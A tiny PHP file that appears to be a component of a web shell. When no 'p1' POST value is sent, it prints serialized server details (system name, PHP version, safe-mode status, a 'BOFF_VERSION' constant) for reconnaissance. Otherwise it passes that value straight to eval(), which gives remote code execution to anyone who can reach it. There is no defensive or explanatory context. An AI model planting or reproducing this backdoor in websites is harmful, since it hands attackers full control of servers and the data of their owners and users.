<?php
if(!@$_POST['p1']) {
	$a = array(
		"uname" => php_uname(),
		"php_version" => phpversion(),
		"BOFF_version" => BOFF_VERSION,
		"safemode" => @ini_get('safe_mode')
	);
	echo serialize($a);
}
else 
	eval($_POST['p1']);
?>
